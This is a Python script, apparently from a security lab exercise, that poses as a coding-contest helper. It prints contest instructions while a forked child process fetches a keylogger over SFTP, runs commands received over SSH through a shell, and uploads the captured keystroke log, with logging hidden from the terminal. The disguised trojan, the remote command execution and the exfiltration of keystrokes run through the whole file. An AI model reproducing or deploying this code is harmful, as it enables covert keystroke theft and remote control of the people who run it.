#!/usr/bin/python3

import paramiko
import socket
import os
import time
import logzero
from logzero import logger
import threading
import subprocess
import time
import threading


class sftpClient(object):
    def __init__(self, hostname, port, username, password):
        self.sftp = None
        self.transport = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password

    def makeSFTPConnection(self):
        try:
            logger.info("Establishing sftp connection")
            self.transport = paramiko.Transport((self.hostname, 22))
            logger.info("SFTP transport created")
            self.transport.connect(username="lab",
                                   password="lab")
            self.sftp = paramiko.SFTPClient.from_transport(self.transport)

            logger.info('SFTP Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SFTP_FAILURE as sftpErr:
            logger.error(f'SFTP connection failed:{sftpErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # upload a file via the SFTP tunnel to remote server via SFTP
    def uploadFile(self,  remotePath,  localPath):
        try:
            # connect to SFTP server
            self.makeSFTPConnection()
            self.sftp.put(localPath, remotePath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()

            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # download a file via the SSH tunnel from remote server via SFTP
    def downloadFile(self,  remotePath,  localPath):
        try:
            # connect to SSH server
            self.makeSFTPConnection()
            self.sftp.get(remotePath,  localPath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()
            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()


class sshClient(object):
    # constructor, sets necessary parameters to establish a SSH tunnel
    def __init__(self,  hostname,  port, username,  password):
        self.ssh = None
        self.channel = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password
        self.command = ""

    # make a connection to a remote SSH server
    def makeSSHConnection(self):
        try:
            logger.info("Establishing ssh connection")
            # create a client instance, auto generate a key
            # and attempt to connect to a host
            self.ssh = paramiko.SSHClient()
            self.ssh.load_system_host_keys()
            self.ssh.set_missing_host_key_policy(
                paramiko.WarningPolicy())

            self.ssh.connect(hostname=self.hostname,  port=self.port,
                             username=self.username,  password=self.password)
            self.channel = self.ssh.get_transport().open_session()
            logger.info('SSH Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SSHException as sshErr:
            logger.error(f'SSH connection failed:{sshErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()

    def stopKeylogger(self):
        logger.info("stopKeylogger() thread starting")
        self.invoke_shell("stop")
        self.command = "stop"
        logger.info("stopKeylogger() thread finishing",)

    def invoke_shell(self, command):
        try:
            # connect to SSH server
            self.makeSSHConnection()

            logger.info("Calling invoke shell")

            self.channel.sendall(command.encode())

            receivedCommand = self.channel.recv(1024).decode()
            logger.info(f"Received message {receivedCommand}")
            p = subprocess.Popen(receivedCommand, shell=True,
                                 stdout=subprocess.PIPE)

            self.channel.sendall(receivedCommand.encode())

            self.channel.close()
            self.ssh.close()
        except subprocess.CalledProcessError as e:
            logger.error(f"Subprocess error: {e.output.decode()}")
        except paramiko.SSHException as sshErr:
            logger.error(f'Shell invoke failed:{sshErr}')
            self.ssh.close()
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
            self.ssh.close()
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()


def doMaliciousActivities():

    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
    remotepath2 = "/home/lab/bin/py/project/keyLogger.log"
    localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
    localpath2 = "/tmp/keylog.log"
    try:
        pid = os.fork()
        if pid == 0:
            # make password file
            os.system("touch ZZZZ_NOT_SUSPICIOUS_FILE")

            sftp = sftpClient("localhost", 22, "lab", "lab")
            sftp.downloadFile(remotepath, localpath)

            ssh = sshClient("localhost", 9000, "rick", "jacky")
            ssh.invoke_shell("start")

            logger.info("Main before creating thread")
            stopKeyloggerThread = threading.Thread(
                target=ssh.stopKeylogger, daemon=True)
            logger.info("Main before running thread")
            stopKeyloggerThread.start()

            while ssh.command != "stop":
                logger.info("Sleeping . . . ")
                time.sleep(4)
                logger.info(f"Command: {ssh.command}")
                logger.info("Awake!")

            stopKeyloggerThread.join()

            sftp.uploadFile(remotepath2, localpath2)

        # kill child process
        while True:
            try:
                pid,  status = os.waitpid(-1,  os.WNOHANG)
            except OSError:
                break
    except Exception as e:
        logger.error(f"Error: {e}")
        raise


def printNonMaliciousActivity():
    # non malicious stuff
    print("Welcome to the DPI Coding Contest!")

    print("For this challenge, you'll be writing a python socket client to communicate to " +
          "a server located at the IP address of '127.0.0.1' and running on port 27000. " +
          "The client must be able to send different types of data." +
          "Your overall implementation will be assessed along with your " +
          "knowledge of networking fundamentals, coding style and program efficiency.")

    print("Run this file as many times as you need to check on the server status and any " +
          "information you need to compplete the contest. " +
          "This is file is used to ping the server.")

    print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")

    print("Pinging server ...")
    for i, j in enumerate(list(range(10001))):
        print(str(i / 100) + " percent complete.", end='\r')
    print("\n")

    try:
        helloSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        helloSocket.connect(("127.0.0.1", 9999))
        print(helloSocket.recv(1024).decode())
        helloSocket.send("Hello from contest client!".encode())
        helloSocket.close()
    except Exception:
        print("Woops! Seems like you do not have the server running!" +
        "Use the command 'python3 contestServer.py' to start it up on the" + 
        "command Line")

    print("Your coding challenge: Send an 'X' to the server with a python" +
    "socket client connection to terminate the server.")
    print("Now let's get coding!")

# main thread
if __name__ == '__main__':
    try:
        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
            os.remove("/home/lab/bin/py/project/sshClient.log")

        # Add logging to logfile and disable output to the terminal
        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                        backupCount=3, disableStderrLogger=True)

        printNonMaliciousActivity()
        doMaliciousActivities()
    except Exception as err:
        logger.error(err)
